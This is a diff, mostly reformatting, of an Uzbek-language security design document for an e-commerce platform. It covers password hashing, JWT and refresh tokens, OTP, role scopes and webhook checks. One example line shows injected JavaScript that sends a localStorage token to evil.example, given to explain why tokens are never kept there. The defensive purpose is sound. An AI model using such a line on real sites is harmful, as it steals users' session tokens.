@@ -229,14 +229,14 @@ ochiq savol sifatida turadi.
 Kanon §6 Argon2id ni belgilaydi. Bu yerda **nega** bcrypt emasligini yozamiz,
 chunki bcrypt hali ham eng ko'p uchraydigan tanlov.
 
-| Mezon | bcrypt | Argon2id |
-|---|---|---|
-| Yosh | 1999 | 2015 (Password Hashing Competition g'olibi) |
-| **Memory-hard** | **Yo'q** — ~4 KB doimiy | **Ha** — sozlanadigan (biz: ~19 MB) |
-| GPU'da hujum | **Arzon.** GPU minglab yadro × 4 KB — bemalol sig'adi | **Qimmat.** 19 MB × 10 000 parallel = 190 GB RAM kerak |
-| ASIC/FPGA | Zaif | Chidamli |
-| Parol uzunligi limiti | **72 bayt** (jimgina kesiladi!) | Yo'q |
-| Rejimlar | Bitta | `argon2i` / `argon2d` / **`argon2id`** (gibrid) |
+| Mezon                 | bcrypt                                                | Argon2id                                               |
+| --------------------- | ----------------------------------------------------- | ------------------------------------------------------ |
+| Yosh                  | 1999                                                  | 2015 (Password Hashing Competition g'olibi)            |
+| **Memory-hard**       | **Yo'q** — ~4 KB doimiy                               | **Ha** — sozlanadigan (biz: ~19 MB)                    |
+| GPU'da hujum          | **Arzon.** GPU minglab yadro × 4 KB — bemalol sig'adi | **Qimmat.** 19 MB × 10 000 parallel = 190 GB RAM kerak |
+| ASIC/FPGA             | Zaif                                                  | Chidamli                                               |
+| Parol uzunligi limiti | **72 bayt** (jimgina kesiladi!)                       | Yo'q                                                   |
+| Rejimlar              | Bitta                                                 | `argon2i` / `argon2d` / **`argon2id`** (gibrid)        |
 
 **Asosiy sabab — memory-hard.** bcrypt faqat CPU vaqtini talab qiladi. Zamonaviy
 GPU (masalan, ijaraga olinadigan) parallel ravishda o'n minglab bcrypt xeshini
@@ -272,8 +272,8 @@ import * as argon2 from 'argon2';
 export const ARGON2_OPTIONS: argon2.Options = {
   type: argon2.argon2id,
   memoryCost: 19456, // 19 MiB (OWASP minimal)
-  timeCost: 2,       // iteratsiya
-  parallelism: 1,    // lane soni
+  timeCost: 2, // iteratsiya
+  parallelism: 1, // lane soni
 };
 
 export class PasswordService {
@@ -321,14 +321,14 @@ Bu Docker build'da alohida ehtiyot talab qiladi (`docs/12-infrastructure.md` §3
 
 ### 2.2. Parol siyosati
 
-| Qoida | Qiymat | Sabab |
-|---|---|---|
-| Minimal uzunlik | 8 belgi | NIST SP 800-63B. Uzunlik > murakkablik |
-| Maksimal uzunlik | 128 belgi | DoS oldini olish (§8.2). Argon2'da 72-bayt limiti yo'q |
-| Murakkablik talabi | **YO'Q** | NIST: "1 ta katta harf + 1 raqam" → `Parol1!`. Foydasi yo'q, UX yomon |
-| Ma'lum sizgan parollar | **Bloklanadi** | HIBP k-anonymity API yoki lokal ro'yxat (§15, savol 4) |
-| Majburiy almashtirish | **YO'Q** | NIST: majburiy almashtirish → `Parol1` → `Parol2`. Faqat sizish shubhasida |
-| Parol tarixi | Oxirgi 3 ta | Faqat ADMIN/OWNER uchun |
+| Qoida                  | Qiymat         | Sabab                                                                      |
+| ---------------------- | -------------- | -------------------------------------------------------------------------- |
+| Minimal uzunlik        | 8 belgi        | NIST SP 800-63B. Uzunlik > murakkablik                                     |
+| Maksimal uzunlik       | 128 belgi      | DoS oldini olish (§8.2). Argon2'da 72-bayt limiti yo'q                     |
+| Murakkablik talabi     | **YO'Q**       | NIST: "1 ta katta harf + 1 raqam" → `Parol1!`. Foydasi yo'q, UX yomon      |
+| Ma'lum sizgan parollar | **Bloklanadi** | HIBP k-anonymity API yoki lokal ro'yxat (§15, savol 4)                     |
+| Majburiy almashtirish  | **YO'Q**       | NIST: majburiy almashtirish → `Parol1` → `Parol2`. Faqat sizish shubhasida |
+| Parol tarixi           | Oxirgi 3 ta    | Faqat ADMIN/OWNER uchun                                                    |
 
 > **Halol izoh:** "murakkablik talabi yo'q" ko'pchilikka noto'g'ri tuyuladi, chunki
 > u hamma joyda bor. NIST SP 800-63B (2017) uni **ataylab olib tashlagan**: u
@@ -339,10 +339,10 @@ Bu Docker build'da alohida ehtiyot talab qiladi (`docs/12-infrastructure.md` §3
 
 Kanon §6: JWT access ~15 min + refresh ~30 kun rotatsiya bilan.
 
-| Token | Muddat | Format | Qayerda saqlanadi | Nima uchun |
-|---|---|---|---|---|
-| **Access** | ~15 daqiqa | JWT (imzolangan, shifrlanmagan) | **Faqat JS xotirasida** | Har so'rovda; stateless tekshiruv |
-| **Refresh** | ~30 kun | Opaque (tasodifiy 32 bayt) | httpOnly cookie | Yangi access olish |
+| Token       | Muddat     | Format                          | Qayerda saqlanadi       | Nima uchun                        |
+| ----------- | ---------- | ------------------------------- | ----------------------- | --------------------------------- |
+| **Access**  | ~15 daqiqa | JWT (imzolangan, shifrlanmagan) | **Faqat JS xotirasida** | Har so'rovda; stateless tekshiruv |
+| **Refresh** | ~30 kun    | Opaque (tasodifiy 32 bayt)      | httpOnly cookie         | Yangi access olish                |
 
 **Nega access — JWT, refresh — opaque:**
 
@@ -362,13 +362,13 @@ Shuning uchun refresh — DB'dagi tasodifiy satr. Bekor qilish = qatorni yangila
 ```ts
 // packages/contracts/src/auth/jwt-payload.ts
 export interface AccessTokenPayload {
-  sub: string;        // User.id (UUID v7)
-  role: UserRole;     // OWNER | ADMIN | MANAGER | SELLER | ...
-  sid: string;        // Session.id — sessiya bo'yicha bekor qilish uchun
-  fid: string;        // familyId — 2.4-bo'lim
+  sub: string; // User.id (UUID v7)
+  role: UserRole; // OWNER | ADMIN | MANAGER | SELLER | ...
+  sid: string; // Session.id — sessiya bo'yicha bekor qilish uchun
+  fid: string; // familyId — 2.4-bo'lim
   iat: number;
   exp: number;
-  jti: string;        // UUID — replay tekshiruvi uchun (kerak bo'lsa)
+  jti: string; // UUID — replay tekshiruvi uchun (kerak bo'lsa)
 }
 ```
 
@@ -714,14 +714,14 @@ retry siyosati nozik:
 
 `docs/14-testing-strategy.md` da concurrency testlari bor. Bu yerga tegishlisi:
 
-| Test | Kutilgan natija |
-|---|---|
-| T1 → rotate → T2. Keyin T1 ni yuborish | 401 `token_reuse_detected`, F1 butunlay bekor |
-| T1 → rotate → T2. T2 ni yuborish | 200, T3 beriladi |
-| T1 ni **bir vaqtda ikki marta** yuborish (parallel) | Aynan bittasi 200 yoki ikkalasi ham 401. **Hech qachon ikkalasi 200 emas** |
-| Reuse'dan keyin eski access token (hali 15 min ichida) | §2.5 ga bog'liq — deny-list bo'lsa 401 |
-| Ikki qurilma (F1, F2). F1 da reuse | F2 **ta'sirlanmaydi** |
-| Reuse → `AuditLog` da yozuv | `AUTH_REFRESH_REUSE_DETECTED` mavjud |
+| Test                                                   | Kutilgan natija                                                            |
+| ------------------------------------------------------ | -------------------------------------------------------------------------- |
+| T1 → rotate → T2. Keyin T1 ni yuborish                 | 401 `token_reuse_detected`, F1 butunlay bekor                              |
+| T1 → rotate → T2. T2 ni yuborish                       | 200, T3 beriladi                                                           |
+| T1 ni **bir vaqtda ikki marta** yuborish (parallel)    | Aynan bittasi 200 yoki ikkalasi ham 401. **Hech qachon ikkalasi 200 emas** |
+| Reuse'dan keyin eski access token (hali 15 min ichida) | §2.5 ga bog'liq — deny-list bo'lsa 401                                     |
+| Ikki qurilma (F1, F2). F1 da reuse                     | F2 **ta'sirlanmaydi**                                                      |
+| Reuse → `AuditLog` da yozuv                            | `AUTH_REFRESH_REUSE_DETECTED` mavjud                                       |
 
 Uchinchi test — **property-based** (kanon §6, `fast-check`): N ta parallel so'rov,
 invariant "muvaffaqiyatli javoblar soni ≤ 1".
@@ -736,11 +736,11 @@ Ya'ni: reuse aniqlangandan keyin ham hujumchining **oxirgi access token'i
 
 Variantlar:
 
-| Variant | Qanday | Narxi |
-|---|---|---|
-| **Hech narsa** | 15 daqiqa kutamiz | Bepul. Hujumchi 15 daqiqa ichkarida |
-| **Redis deny-list** | Har so'rovda `sid` Redis'da tekshiriladi | Har so'rovga +1 Redis o'qish. Stateless'lik yarim yo'qoladi |
-| **Access TTL ni qisqartirish** | 15 min → 2 min | Refresh chastotasi 7 barobar oshadi |
+| Variant                        | Qanday                                   | Narxi                                                       |
+| ------------------------------ | ---------------------------------------- | ----------------------------------------------------------- |
+| **Hech narsa**                 | 15 daqiqa kutamiz                        | Bepul. Hujumchi 15 daqiqa ichkarida                         |
+| **Redis deny-list**            | Har so'rovda `sid` Redis'da tekshiriladi | Har so'rovga +1 Redis o'qish. Stateless'lik yarim yo'qoladi |
+| **Access TTL ni qisqartirish** | 15 min → 2 min                           | Refresh chastotasi 7 barobar oshadi                         |
 
 **Kelvin qarori — gibrid:**
 
@@ -774,10 +774,10 @@ async function isRevoked(payload: AccessTokenPayload): Promise<boolean> {
 
 Bu yerda ko'p loyihalar xato qiladi, shuning uchun aniq yoziladi.
 
-| Token | Qayerda | Nega |
-|---|---|---|
-| **Refresh** | `httpOnly; Secure; SameSite=Strict; Path=/auth` cookie | JS o'qiy olmaydi → XSS uni **o'g'irlay olmaydi** |
-| **Access** | **JS xotirasida** (Zustand store, modul o'zgaruvchisi) | Sahifa yangilanishida yo'qoladi → refresh'dan qayta olinadi |
+| Token       | Qayerda                                                | Nega                                                        |
+| ----------- | ------------------------------------------------------ | ----------------------------------------------------------- |
+| **Refresh** | `httpOnly; Secure; SameSite=Strict; Path=/auth` cookie | JS o'qiy olmaydi → XSS uni **o'g'irlay olmaydi**            |
+| **Access**  | **JS xotirasida** (Zustand store, modul o'zgaruvchisi) | Sahifa yangilanishida yo'qoladi → refresh'dan qayta olinadi |
 
 **`localStorage` HECH QACHON ishlatilmaydi.**
 
@@ -787,7 +787,7 @@ tokenni o'g'irlaydi:
 
 ```js
 // Hujumchining sahifaga kirgan bitta qatori:
-fetch('https://evil.example/c?t=' + localStorage.getItem('token'))
+fetch('https://evil.example/c?t=' + localStorage.getItem('token'));
 ```
 
 Aynan shu sabab `sessionStorage` ham yaramaydi — u ham JS'ga ochiq.
@@ -797,10 +797,10 @@ Aynan shu sabab `sessionStorage` ham yaramaydi — u ham JS'ga ochiq.
 ```ts
 // apps/api/src/modules/identity/auth.controller.ts (fragment)
 res.cookie('kelvin_rt', refreshToken, {
-  httpOnly: true,     // JS o'qiy olmaydi — XSS himoyasi
-  secure: true,       // faqat HTTPS. Prod'da MAJBURIY
+  httpOnly: true, // JS o'qiy olmaydi — XSS himoyasi
+  secure: true, // faqat HTTPS. Prod'da MAJBURIY
   sameSite: 'strict', // CSRF himoyasi: cross-site so'rovda yuborilmaydi
-  path: '/auth',      // faqat /auth/* ga yuboriladi — sizish yuzasi kichrayadi
+  path: '/auth', // faqat /auth/* ga yuboriladi — sizish yuzasi kichrayadi
   maxAge: REFRESH_TTL_DAYS * 86_400_000,
   // domain: ataylab qo'yilmaydi -> host-only cookie.
   // '.kelvin.uz' qo'ysak, har subdomen uni ko'radi.
@@ -854,15 +854,15 @@ export interface SmsProvider {
 
 **OTP xavfsizlik qoidalari:**
 
-| Qoida | Qiymat | Sabab |
-|---|---|---|
-| Uzunlik | 6 raqam | 4 raqam = 10 000 variant — brute-force arzon |
-| Generatsiya | `crypto.randomInt` (CSPRNG) | `Math.random()` — **taxmin qilinadi**. Hech qachon |
-| TTL | 5 daqiqa | Uzoq TTL = katta brute-force oynasi |
-| Urinishlar | **3 ta**, keyin OTP kuyadi | Yangi OTP so'rash kerak → yangi SMS → §8.4 limitiga tushadi |
-| Saqlash | Redis, SHA-256 xesh | Baza/log sizsa OTP ochiq bo'lmasin |
-| Bir martalik | Ishlatilgach darhol o'chiriladi | Replay |
-| Javob matni | **Har doim bir xil** | "Bu raqam ro'yxatdan o'tmagan" → foydalanuvchi sanash imkoni (enumeration) |
+| Qoida        | Qiymat                          | Sabab                                                                      |
+| ------------ | ------------------------------- | -------------------------------------------------------------------------- |
+| Uzunlik      | 6 raqam                         | 4 raqam = 10 000 variant — brute-force arzon                               |
+| Generatsiya  | `crypto.randomInt` (CSPRNG)     | `Math.random()` — **taxmin qilinadi**. Hech qachon                         |
+| TTL          | 5 daqiqa                        | Uzoq TTL = katta brute-force oynasi                                        |
+| Urinishlar   | **3 ta**, keyin OTP kuyadi      | Yangi OTP so'rash kerak → yangi SMS → §8.4 limitiga tushadi                |
+| Saqlash      | Redis, SHA-256 xesh             | Baza/log sizsa OTP ochiq bo'lmasin                                         |
+| Bir martalik | Ishlatilgach darhol o'chiriladi | Replay                                                                     |
+| Javob matni  | **Har doim bir xil**            | "Bu raqam ro'yxatdan o'tmagan" → foydalanuvchi sanash imkoni (enumeration) |
 
 **Eng katta xavf — SMS pul turadi (§8.4).** Bu oddiy rate limiting emas, bu
 **to'g'ridan-to'g'ri moliyaviy DoS**. Hujumchi tasodifiy raqamlarga OTP so'rab,
@@ -919,11 +919,11 @@ OTP buni tuzatadi: hujumchida **telefon qurilmasi** bo'lishi kerak.
 
 **Narxi va halol e'tirof:**
 
-| Muammo | Izoh |
-|---|---|
-| Har tekshiruv — SMS puli | §8.4 limiti qattiq qo'llanadi |
-| UX og'irlashadi | Mijoz "buyurtmam qayerda?" uchun OTP kutadi |
-| Alternativa | SMS'dagi **imzolangan havola** (`?t=<HMAC>`): OTP'siz, lekin havola SMS'da → telefon o'g'irlansa ochiq |
+| Muammo                   | Izoh                                                                                                   |
+| ------------------------ | ------------------------------------------------------------------------------------------------------ |
+| Har tekshiruv — SMS puli | §8.4 limiti qattiq qo'llanadi                                                                          |
+| UX og'irlashadi          | Mijoz "buyurtmam qayerda?" uchun OTP kutadi                                                            |
+| Alternativa              | SMS'dagi **imzolangan havola** (`?t=<HMAC>`): OTP'siz, lekin havola SMS'da → telefon o'g'irlansa ochiq |
 
 > **Ochiq savol (§15, savol 9):** OTP'mi yoki imzolangan havolami? Bu **UX va
 > xavfsizlik o'rtasidagi savdo** va do'kon egasi qaror qiladi. Texnik tavsiya:
@@ -950,14 +950,14 @@ avtomatik bog'lanadimi?
 
 **Kimga majburiy:**
 
-| Rol | 2FA | Sabab |
-|---|---|---|
-| `OWNER` | **Majburiy** | Butun tizim |
-| `ADMIN` | **Majburiy** | Rol berish, narx, sozlama |
-| `ACCOUNTANT` | **Majburiy** | Ledger, refund |
-| `MANAGER` | Tavsiya etiladi | Chegirma tasdig'i, inventarizatsiya tuzatishi |
-| `SELLER`, `COURIER`, `WAREHOUSE` | Yo'q | UX narxi > foyda. Ular smena davomida ko'p marta kiradi |
-| `CUSTOMER` | Ixtiyoriy | Majburlash konversiyani o'ldiradi |
+| Rol                              | 2FA             | Sabab                                                   |
+| -------------------------------- | --------------- | ------------------------------------------------------- |
+| `OWNER`                          | **Majburiy**    | Butun tizim                                             |
+| `ADMIN`                          | **Majburiy**    | Rol berish, narx, sozlama                               |
+| `ACCOUNTANT`                     | **Majburiy**    | Ledger, refund                                          |
+| `MANAGER`                        | Tavsiya etiladi | Chegirma tasdig'i, inventarizatsiya tuzatishi           |
+| `SELLER`, `COURIER`, `WAREHOUSE` | Yo'q            | UX narxi > foyda. Ular smena davomida ko'p marta kiradi |
+| `CUSTOMER`                       | Ixtiyoriy       | Majburlash konversiyani o'ldiradi                       |
 
 **Nega TOTP (RFC 6238), SMS emas:** SMS 2FA — SIM-swap hujumiga zaif va har
 kirish pul turadi. TOTP bepul va offline ishlaydi (Google Authenticator,
@@ -978,9 +978,9 @@ Aegis va h.k.).
 
 ### 2.10. OAuth — ochiq savol
 
-| Provayder | Foyda | Muammo |
-|---|---|---|
-| **Google** | Tanish, bepul | O'zbekistonda ko'p mijozda Google hisobi ishlatilmaydi. **Telefon berilmaydi** — baribir OTP kerak |
+| Provayder          | Foyda                                                                                    | Muammo                                                                                                                               |
+| ------------------ | ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| **Google**         | Tanish, bepul                                                                            | O'zbekistonda ko'p mijozda Google hisobi ishlatilmaydi. **Telefon berilmaydi** — baribir OTP kerak                                   |
 | **Telegram Login** | O'zbekistonda Telegram **juda keng tarqalgan**. Kanon §6: Telegram bot allaqachon rejada | Widget domenga bog'lanadi. Imzo tekshiruvi (HMAC-SHA256, bot token asosida). **Telefon ixtiyoriy** — foydalanuvchi bermasligi mumkin |
 
 > **Ochiq savol (§15, savol 11):** OAuth kerakmi? Texnik pozitsiya: **MVP'da
@@ -1036,18 +1036,18 @@ OWASP Top 10 da u A01 — **birinchi o'rinda** (§10).
 To'liq 10×45 matritsa `docs/01-product-spec.md` da. Bu yerda faqat xavfsizlik
 nuqtai nazaridan muhimlari:
 
-| Rol | Ishonch darajasi | Eng xavfli huquqi |
-|---|---|---|
-| `OWNER` | To'liq | Hammasi. **Rol berish** |
-| `ADMIN` | Yuqori | Narx, sozlama, foydalanuvchi |
-| `ACCOUNTANT` | Yuqori (pul) | **Refund**, ledger ko'rish |
-| `MANAGER` | O'rta | Chegirma tasdig'i, **inventarizatsiya tuzatishi** |
-| `SELLER` | Past | **Chegirma (limitli)**, POS smena |
-| `WAREHOUSE` | Past | Qoldiq harakati |
-| `COURIER` | Eng past | Jo'natma holati, **naqd qabul qilish** |
-| `CONTENT` | Past | Blog, banner |
-| `SUPPORT` | Past | Mijoz ma'lumotini **ko'rish** (§6.4 — bu ham xavf) |
-| `CUSTOMER` | Ishonchsiz | Faqat o'ziniki |
+| Rol          | Ishonch darajasi | Eng xavfli huquqi                                  |
+| ------------ | ---------------- | -------------------------------------------------- |
+| `OWNER`      | To'liq           | Hammasi. **Rol berish**                            |
+| `ADMIN`      | Yuqori           | Narx, sozlama, foydalanuvchi                       |
+| `ACCOUNTANT` | Yuqori (pul)     | **Refund**, ledger ko'rish                         |
+| `MANAGER`    | O'rta            | Chegirma tasdig'i, **inventarizatsiya tuzatishi**  |
+| `SELLER`     | Past             | **Chegirma (limitli)**, POS smena                  |
+| `WAREHOUSE`  | Past             | Qoldiq harakati                                    |
+| `COURIER`    | Eng past         | Jo'natma holati, **naqd qabul qilish**             |
+| `CONTENT`    | Past             | Blog, banner                                       |
+| `SUPPORT`    | Past             | Mijoz ma'lumotini **ko'rish** (§6.4 — bu ham xavf) |
+| `CUSTOMER`   | Ishonchsiz       | Faqat o'ziniki                                     |
 
 **Huquq rol'dan hisoblanadi, token'da saqlanmaydi** (§2.3). Sabab: xodim
 ishdan bo'shatilsa, uning token'idagi huquqlar ro'yxati 15 daqiqa yashaydi.
@@ -1055,10 +1055,10 @@ Rol'dan hisoblansa — `User.role` o'zgarishi + deny-list (§2.5) darhol ta'sir 
 
 ### 3.3. CASL yoki custom guard — qaror
 
-| Variant | Foyda | Zarar |
-|---|---|---|
-| **CASL** | Deklarativ, shart bo'yicha (`can('read', 'Order', { customerId: user.id })`), frontend'da qayta ishlatiladi | Yangi kutubxona, Prisma `where` ga o'girish qo'shimcha qatlam (`@casl/prisma`), abstraksiya sizib chiqadi |
-| **Custom guard + repository filtri** | Aniq, kutubxonasiz, Prisma bilan tabiiy | Qo'lda yoziladi, unutish oson (**aynan IDOR sababi**) |
+| Variant                              | Foyda                                                                                                       | Zarar                                                                                                     |
+| ------------------------------------ | ----------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
+| **CASL**                             | Deklarativ, shart bo'yicha (`can('read', 'Order', { customerId: user.id })`), frontend'da qayta ishlatiladi | Yangi kutubxona, Prisma `where` ga o'girish qo'shimcha qatlam (`@casl/prisma`), abstraksiya sizib chiqadi |
+| **Custom guard + repository filtri** | Aniq, kutubxonasiz, Prisma bilan tabiiy                                                                     | Qo'lda yoziladi, unutish oson (**aynan IDOR sababi**)                                                     |
 
 **Kelvin qarori: custom guard + majburiy scope filtri.**
 
@@ -1124,10 +1124,7 @@ export class ScopedOrderRepository {
       case UserRole.SELLER:
         // Faqat O'ZI yaratgan yoki o'z smenasidagi buyurtmalar.
         return {
-          OR: [
-            { sellerId: actor.userId },
-            { posShift: { sellerId: actor.userId } },
-          ],
+          OR: [{ sellerId: actor.userId }, { posShift: { sellerId: actor.userId } }],
         };
 
       case UserRole.COURIER:
@@ -1172,15 +1169,15 @@ export class ScopedOrderRepository {
 
 **Aynan shu naqsh qo'llaniladigan resurslar:**
 
-| Resurs | Scope qoidasi |
-|---|---|
-| `Order` | Yuqoridagi |
-| `Shipment` | `COURIER` → faqat `courierId = actor.userId` |
-| `PosShift` | `SELLER` → faqat `sellerId = actor.userId` |
-| `Customer` | `CUSTOMER` → faqat o'zi. `SELLER` → **faqat aloqada bo'lgan mijozlar** (§6.4) |
-| `Cart` | `CUSTOMER` → o'zi. Mehmon → cookie'dagi `cartToken` bo'yicha |
-| `Review` | Yozish: faqat **sotib olgan** mijoz (`docs/01`) |
-| `Payment`, `LedgerEntry` | Faqat `ACCOUNTANT`/`OWNER`. Mijoz → faqat o'z to'lovi |
+| Resurs                   | Scope qoidasi                                                                 |
+| ------------------------ | ----------------------------------------------------------------------------- |
+| `Order`                  | Yuqoridagi                                                                    |
+| `Shipment`               | `COURIER` → faqat `courierId = actor.userId`                                  |
+| `PosShift`               | `SELLER` → faqat `sellerId = actor.userId`                                    |
+| `Customer`               | `CUSTOMER` → faqat o'zi. `SELLER` → **faqat aloqada bo'lgan mijozlar** (§6.4) |
+| `Cart`                   | `CUSTOMER` → o'zi. Mehmon → cookie'dagi `cartToken` bo'yicha                  |
+| `Review`                 | Yozish: faqat **sotib olgan** mijoz (`docs/01`)                               |
+| `Payment`, `LedgerEntry` | Faqat `ACCOUNTANT`/`OWNER`. Mijoz → faqat o'z to'lovi                         |
 
 ### 3.5. 403 emas, 404 — nega
 
@@ -1284,12 +1281,12 @@ sequenceDiagram
 
 **Amaliy oqibatlar:**
 
-| Qoida | Sabab |
-|---|---|
-| Karta maydonlari **frontend'da ham yo'q** | Bo'lsa — XSS orqali o'g'irlanadi va Kelvin **baribir** scope'ga tushadi |
-| Provayder iframe/redirect ishlatiladi | Karta ma'lumoti provayder domenida kiritiladi |
-| Log'da PAN'ga o'xshash naqsh **bloklanadi** | §11.5 redaction. Tasodifan tushib qolish xavfi bor |
-| Saqlanadigan yagona narsa | Provayder **tokeni** (`Payment.providerToken`) va **oxirgi 4 raqam** (chek uchun) |
+| Qoida                                       | Sabab                                                                             |
+| ------------------------------------------- | --------------------------------------------------------------------------------- |
+| Karta maydonlari **frontend'da ham yo'q**   | Bo'lsa — XSS orqali o'g'irlanadi va Kelvin **baribir** scope'ga tushadi           |
+| Provayder iframe/redirect ishlatiladi       | Karta ma'lumoti provayder domenida kiritiladi                                     |
+| Log'da PAN'ga o'xshash naqsh **bloklanadi** | §11.5 redaction. Tasodifan tushib qolish xavfi bor                                |
+| Saqlanadigan yagona narsa                   | Provayder **tokeni** (`Payment.providerToken`) va **oxirgi 4 raqam** (chek uchun) |
 
 > **Karta tokenizatsiyasi:** takroriy to'lov (rassrochka avtoto'lovi) kerak
 > bo'lsa — **provayderning** tokeni ishlatiladi. Token — bu karta emas,
@@ -1334,10 +1331,7 @@ import { createHmac, timingSafeEqual } from 'node:crypto';
  */
 
 // apps/api/src/main.ts
-app.use(
-  '/webhooks',
-  express.raw({ type: 'application/json', limit: '256kb' }),
-);
+app.use('/webhooks', express.raw({ type: 'application/json', limit: '256kb' }));
 // Faqat /webhooks uchun. Qolgan API normal JSON parser ishlatadi.
 
 export function verifySignature(
@@ -1382,11 +1376,11 @@ hujumchi bir marta haqiqiy "to'lov muvaffaqiyatli" webhook'ini ushlab qolsa
 
 Uch qavatli himoya:
 
-| Qavat | Qanday | Nimadan himoya qiladi |
-|---|---|---|
-| **1. Timestamp oynasi** | Webhook'dagi vaqt joriy vaqtdan ±N daqiqadan uzoq bo'lsa → rad | Eski xabarni qayta yuborish |
-| **2. Idempotentlik kaliti** | Provayder tranzaksiya ID'si `unique` ustunga yoziladi | Bir xil xabarning takrori |
-| **3. Holat mashinasi** | `PAID` → `PAID` o'tishi taqiqlangan | Mantiqiy takror |
+| Qavat                       | Qanday                                                         | Nimadan himoya qiladi       |
+| --------------------------- | -------------------------------------------------------------- | --------------------------- |
+| **1. Timestamp oynasi**     | Webhook'dagi vaqt joriy vaqtdan ±N daqiqadan uzoq bo'lsa → rad | Eski xabarni qayta yuborish |
+| **2. Idempotentlik kaliti** | Provayder tranzaksiya ID'si `unique` ustunga yoziladi          | Bir xil xabarning takrori   |
+| **3. Holat mashinasi**      | `PAID` → `PAID` o'tishi taqiqlangan                            | Mantiqiy takror             |
 
 ```ts
 // Idempotentlik — DB darajasida, ilova darajasida EMAS.
@@ -1421,14 +1415,14 @@ try {
 
 ### 4.5. Webhook — qolgan qoidalar
 
-| Qoida | Sabab |
-|---|---|
-| **Summa tekshiriladi** | Webhook'dagi summa `Order.total` ga teng bo'lishi shart. Aks holda: hujumchi 1000 so'mlik to'lov qilib, webhook'da 5 000 000 deb yozadi |
-| **HTTPS majburiy** | Aks holda MITM imzoni ham, tarkibni ham ko'radi |
-| **IP allowlist** — ixtiyoriy | Provayder IP'lari ma'lum bo'lsa, qo'shimcha qatlam. ⚠️ IP'lar noma'lum → §15. **Imzo o'rnini bosmaydi** |
-| **Rate limiting — YO'Q** | ⚠️ Webhook'ni cheklab, haqiqiy to'lov xabarini yo'qotish — bundan battari. §8.5 |
-| **Tez javob (< 5s)** | Og'ir ish → BullMQ job'ga. Provayder timeout'da qayta urinadi → keraksiz takror |
-| **Log'ga to'liq body — YO'Q** | Provayder body'sida shaxsiy ma'lumot bo'lishi mumkin (§6) |
+| Qoida                         | Sabab                                                                                                                                   |
+| ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
+| **Summa tekshiriladi**        | Webhook'dagi summa `Order.total` ga teng bo'lishi shart. Aks holda: hujumchi 1000 so'mlik to'lov qilib, webhook'da 5 000 000 deb yozadi |
+| **HTTPS majburiy**            | Aks holda MITM imzoni ham, tarkibni ham ko'radi                                                                                         |
+| **IP allowlist** — ixtiyoriy  | Provayder IP'lari ma'lum bo'lsa, qo'shimcha qatlam. ⚠️ IP'lar noma'lum → §15. **Imzo o'rnini bosmaydi**                                 |
+| **Rate limiting — YO'Q**      | ⚠️ Webhook'ni cheklab, haqiqiy to'lov xabarini yo'qotish — bundan battari. §8.5                                                         |
+| **Tez javob (< 5s)**          | Og'ir ish → BullMQ job'ga. Provayder timeout'da qayta urinadi → keraksiz takror                                                         |
+| **Log'ga to'liq body — YO'Q** | Provayder body'sida shaxsiy ma'lumot bo'lishi mumkin (§6)                                                                               |
 
 ---
 
@@ -1488,13 +1482,13 @@ export class AddCartItemDto {
 `docs/07-order-and-checkout.md` da narx snapshot'i batafsil. Xavfsizlik uchun
 muhim qismi:
 
-| Bosqich | Narx manbai |
-|---|---|
-| Katalog ko'rish | `pricing` dvigateli, keshlanadi |
-| Savatga qo'shish | **Saqlanmaydi.** Savat faqat `variantId` + `qty` |
-| Savatni ko'rsatish | **Har safar qayta hisoblanadi** |
-| Checkout boshlanishi | Hisoblanadi va `Order` ga **snapshot** qilinadi |
-| To'lov | **Faqat `Order.total`** ishlatiladi |
+| Bosqich              | Narx manbai                                      |
+| -------------------- | ------------------------------------------------ |
+| Katalog ko'rish      | `pricing` dvigateli, keshlanadi                  |
+| Savatga qo'shish     | **Saqlanmaydi.** Savat faqat `variantId` + `qty` |
+| Savatni ko'rsatish   | **Har safar qayta hisoblanadi**                  |
+| Checkout boshlanishi | Hisoblanadi va `Order` ga **snapshot** qilinadi  |
+| To'lov               | **Faqat `Order.total`** ishlatiladi              |
 
 **Nega savatda narx saqlanmaydi:** saqlansa — u eskiradi. Mijoz savatga
 qo'shadi, narx ko'tariladi, u bir oydan keyin checkout qiladi → eski narx.
@@ -1540,14 +1534,14 @@ chegirmani hammaga beradi.
 
 **Choralar:**
 
-| Chora | Detal |
-|---|---|
-| **Rate limiting** | 5 urinish / 10 daqiqa / sessiya **va** IP (§8.3) |
-| **Yagona javob** | "Kod noto'g'ri yoki amal qilmaydi" — **har doim bir xil**. "Muddati o'tgan" degan javob → kod **mavjudligini** oshkor qiladi |
-| **Shaxsiy kodlar tasodifiy** | Bitta mijozga beriladigan kod — CSPRNG, kamida 10 belgi. `AZIZ10` — taxmin qilinadi |
-| **Ishlatilish limiti** | `Discount.maxUses`, `maxUsesPerCustomer` — atomik hisoblanadi |
-| **Audit** | Har qo'llash `AuditLog` da (§11.3) |
-| **Anomaliya** | Bitta kod kutilmaganda ko'p ishlatilsa → alert (kod sizib ketgan) |
+| Chora                        | Detal                                                                                                                        |
+| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
+| **Rate limiting**            | 5 urinish / 10 daqiqa / sessiya **va** IP (§8.3)                                                                             |
+| **Yagona javob**             | "Kod noto'g'ri yoki amal qilmaydi" — **har doim bir xil**. "Muddati o'tgan" degan javob → kod **mavjudligini** oshkor qiladi |
+| **Shaxsiy kodlar tasodifiy** | Bitta mijozga beriladigan kod — CSPRNG, kamida 10 belgi. `AZIZ10` — taxmin qilinadi                                          |
+| **Ishlatilish limiti**       | `Discount.maxUses`, `maxUsesPerCustomer` — atomik hisoblanadi                                                                |
+| **Audit**                    | Har qo'llash `AuditLog` da (§11.3)                                                                                           |
+| **Anomaliya**                | Bitta kod kutilmaganda ko'p ishlatilsa → alert (kod sizib ketgan)                                                            |
 
 **Atomik hisoblash — nozik joy:**
 
@@ -1570,15 +1564,15 @@ if (updated === 0) throw new BadRequestException('invalid_or_exhausted_code');
 
 ### 5.4. Savat manipulyatsiyasi
 
-| Hujum | Chora |
-|---|---|
-| **Manfiy miqdor** (`qty: -5` → summa kamayadi) | `@Min(1)`. **`@IsInt()` ham shart** — `qty: 0.5` float bilan narx bo'linadi |
-| **Ulkan miqdor** (`qty: 999999`) | `@Max(999)` + qoldiq tekshiruvi (`docs/06`). `BigInt` overflow — kanon §8 tufayli muammo emas |
